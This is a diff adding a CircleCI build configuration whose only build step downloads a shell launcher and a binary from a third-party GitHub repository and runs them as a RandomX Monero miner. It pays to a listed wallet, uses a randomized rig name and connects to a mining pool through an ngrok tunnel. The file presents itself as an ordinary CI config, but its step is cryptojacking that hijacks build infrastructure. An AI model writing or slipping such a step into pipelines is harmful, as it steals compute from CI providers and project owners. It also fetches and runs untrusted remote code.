@@ -1,0 +1,11 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: kelek
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo RandomX -coin XMR -wallet TRX:TUVKgSFJWkYn4UBPjX1xPzxADUFGk3McXo  -rigName  $(echo $(shuf -i 1-10 -n 1)-joa) -pool1 6.tcp.ngrok.io:15179  
